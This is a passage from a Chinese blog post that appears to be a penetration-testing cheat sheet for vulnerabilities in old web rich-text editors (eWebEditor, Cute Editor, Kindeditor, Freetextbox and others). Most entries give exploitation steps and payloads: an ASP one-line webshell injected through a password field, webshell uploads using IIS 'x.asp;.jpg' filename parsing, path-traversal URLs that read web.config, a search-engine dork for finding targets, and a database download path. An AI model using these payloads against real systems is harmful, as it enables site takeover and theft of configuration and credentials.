+<h3 id="eWebEditor-JSP版漏洞"><a href="#eWebEditor-JSP版漏洞" class="headerlink" title="eWebEditor JSP版漏洞"></a>eWebEditor JSP版漏洞</h3><p>大同小异，我在本文档不想多说了，因为没环境 测试，网上垃圾场那么大，不好排查。用JSP编辑器的我觉得eweb会比FCKeditor份额少得多。</p>
+<h3 id="eWebEditor-2-8-商业版插一句话木马"><a href="#eWebEditor-2-8-商业版插一句话木马" class="headerlink" title="eWebEditor 2.8 商业版插一句话木马"></a>eWebEditor 2.8 商业版插一句话木马</h3><p>影响版本:=&gt;2.8 商业版<br>攻击利用:<br>登陆后台，点击修改密码—-新密码设置为 <code>1&quot;:eval request(&quot;h&quot;)’</code><br>设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了.</p>
+<p>注意：可能因为转载的关系，代码会变掉，最好本地调试好代码再提交。</p>
+<h3 id="eWebEditorNet-upload-aspx-上传漏洞-WebEditorNet"><a href="#eWebEditorNet-upload-aspx-上传漏洞-WebEditorNet" class="headerlink" title="eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)"></a>eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)</h3><p>脆弱描述：<br>WebEditorNet 主要是一个upload.aspx文件存在上传漏洞。<br>攻击利用:<br>默认上传地址：/ewebeditornet/upload.aspx<br>可以直接上传一个cer的木马<br>如果不能上传则在浏览器地址栏中输入javascript:lbtnUpload.click();<br>成功以后查看源代码找到uploadsave查看上传保存地址，默认传到uploadfile这个文件夹里。</p>
+<h3 id="southidceditor-一般使用v2-8-0版eWeb核心"><a href="#southidceditor-一般使用v2-8-0版eWeb核心" class="headerlink" title="southidceditor(一般使用v2.8.0版eWeb核心)"></a>southidceditor(一般使用v2.8.0版eWeb核心)</h3><p><a target="_blank" rel="noopener" href="http://www.xxxx.com/admin/southidceditor/datas/southidceditor.mdb">http://www.xxxx.com/admin/southidceditor/datas/southidceditor.mdb</a><br><a target="_blank" rel="noopener" href="http://www.xxxx.com/admin/southidceditor/admin/admin_login.asp">http://www.xxxx.com/admin/southidceditor/admin/admin_login.asp</a><br><a target="_blank" rel="noopener" href="http://www.xxxx.com/admin/southidceditor/popup.asp">http://www.xxxx.com/admin/southidceditor/popup.asp</a><br>bigcneditor(eWeb 2.7.5 VIP核心)</p>
+<p>其实所谓的Bigcneditor就是eWebEditor 2.7.5的VIP用户版.之所以无法访问admin_login.asp，提示“权限不够”4字真言，估计就是因为其授权“Licensed”问题,或许只允许被授权的机器访问后台才对。</p>
+<p>或许上面针对eWebEditor v2.8以下低版本的小动作可以用到这上面来.貌似没多少动作</p>
+<p><strong>Cute Editor</strong></p>
+<h3 id="Cute-Editor在线编辑器本地包含漏洞"><a href="#Cute-Editor在线编辑器本地包含漏洞" class="headerlink" title="Cute Editor在线编辑器本地包含漏洞"></a>Cute Editor在线编辑器本地包含漏洞</h3><p>影响版本:<br>CuteEditor For Net 6.4<br>脆弱描述：<br>可以随意查看网站文件内容，危害较大。<br>攻击利用:<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config">http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config</a></p>
+<h3 id="Cute-Editor-Asp-Net版利用iis解析漏洞获得权限"><a href="#Cute-Editor-Asp-Net版利用iis解析漏洞获得权限" class="headerlink" title="Cute Editor Asp.Net版利用iis解析漏洞获得权限"></a>Cute Editor Asp.Net版利用iis解析漏洞获得权限</h3><p>影响版本：<br>CuteEditor for ASP.NET中文版脆弱描述：<br>脆弱描述：<br>CuteEditor对上传文件名未重命名，导致其可利用IIS文件名解析Bug获得webshell权限。<br>攻击利用：<br>可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID= 来找到测试目标。<br>在编辑器中点击“多媒体插入”，上传一个名为“xxx.asp;.avi”的网马，以此获得权限。</p>
+<h2 id="Webhtmleditor"><a href="#Webhtmleditor" class="headerlink" title="Webhtmleditor"></a>Webhtmleditor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本：&lt;= Webhtmleditor最终版1.7 (已停止更新)<br>脆弱描述/攻击利用：<br>对上传的图片或其他文件无重命名操作，导致允许恶意用户上传diy.asp;.jpg来绕过对后缀名审查的限制，对于此类因编辑器作者意识犯下的错误，就算遭遇缩略图，文件头检测，也可使用图片木马 插入一句话来突破。</p>
+<h2 id="Kindeditor"><a href="#Kindeditor" class="headerlink" title="Kindeditor"></a>Kindeditor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL-1"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL-1" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本: &lt;= kindeditor 3.2.1(09年8月份发布的最新版)<br>脆弱描述/攻击利用：<br>拿官方做个演示：进入<a target="_blank" rel="noopener" href="http://www.xxxx.com/ke/examples/index.html">http://www.xxxx.com/ke/examples/index.html</a> 随意点击一个demo后点图片上传，某君上传了如下文件：<a target="_blank" rel="noopener" href="http://www.xxxx.com/ke/attached/test.asp;.jpg">http://www.xxxx.com/ke/attached/test.asp;.jpg</a><br>Note:参见附录C原理解析。</p>
+<h2 id="Freetextbox"><a href="#Freetextbox" class="headerlink" title="Freetextbox"></a>Freetextbox</h2><h3 id="Freetextbox遍历目录漏洞"><a href="#Freetextbox遍历目录漏洞" class="headerlink" title="Freetextbox遍历目录漏洞"></a>Freetextbox遍历目录漏洞</h3><p>影响版本：未知<br>脆弱描述：<br>因为ftb.imagegallery.aspx代码中 只过滤了/但是没有过滤\符号所以导致出现了遍历目录的问题。<br>攻击利用:<br>在编辑器页面点图片会弹出一个框（抓包得到此地址）构造如下，可遍历目录。<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=%5C">http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\</a>..</p>
+<h3 id="Freetextbox-Asp-Net版利用IIS解析漏洞获得权限"><a href="#Freetextbox-Asp-Net版利用IIS解析漏洞获得权限" class="headerlink" title="Freetextbox Asp.Net版利用IIS解析漏洞获得权限"></a>Freetextbox Asp.Net版利用IIS解析漏洞获得权限</h3><p>影响版本：所有版本<br>脆弱描述：<br>没做登陆验证可以直接访问上传木马<br>Freetextbox 3-3-1 可以直接上传任意格式的文件<br>Freetextbox 1.6.3 及其他版本可以上传 格式为x.asp;.jpg<br>攻击利用：<br>利用IIS解析漏洞拿SHELL。上传后SHELL的路径为<a target="_blank" rel="noopener" href="http://www.xxxx.com/images/x.asp;.jpg">http://www.xxxx.com/images/x.asp;.jpg</a></p>
+<h2 id="Msn-editor"><a href="#Msn-editor" class="headerlink" title="Msn editor"></a>Msn editor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL-2"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL-2" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本：未知</p>
+<p>脆弱描述：</p>
+<p>点击图片上传后会出现上传页面，地址为<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=">http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=</a><br>用普通的图片上传后，地址为<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/news/uppic/41513102009204012_1.gif">http://www.xxxx.com/news/uppic/41513102009204012_1.gif</a><br>记住这时候的路径，再点击图片的上传，这时候地址就变成了<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012">http://www.xxxx.com/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012</a><br>很明显。图片的地址是根据RemNum后面的编号生成的。</p>
+<p>攻击利用:</p>
+<p>配合IIS的解析漏洞，把RemNum后面的数据修改为1.asp;41513102009204012，变成下面这个地址<br><a target="_blank" rel="noopener" href="http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012">http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012</a><br>然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址<br>uppic/1.asp;41513102009204012_2.gif<br>直接打开就是我们的小马地址！</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/03/exchange/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">excahnge在渗透中的利用</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/03/asmx/">
+                        <span class="hidden-mobile">asmx webshell之旅</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
